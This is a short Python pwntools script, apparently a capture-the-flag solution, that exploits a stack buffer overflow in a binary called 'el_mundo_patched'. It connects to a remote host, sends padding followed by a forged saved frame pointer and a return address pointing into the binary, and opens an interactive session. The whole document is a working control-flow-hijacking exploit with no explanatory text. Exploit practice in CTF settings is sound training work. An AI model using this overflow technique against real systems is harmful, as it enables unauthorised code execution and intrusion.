#!/usr/bin/env python3

from pwn import *

exe = ELF("./el_mundo_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.49.188',34507)
#gdb.attach(p,gdbscript='''
#           b*0x0000000000401819
#           b*0x00000000004018A2
#           ''')



payload = b'a'*0x30 + p64(0) + p64(0x00000000004016B7)
p.sendline(payload)


p.interactive()

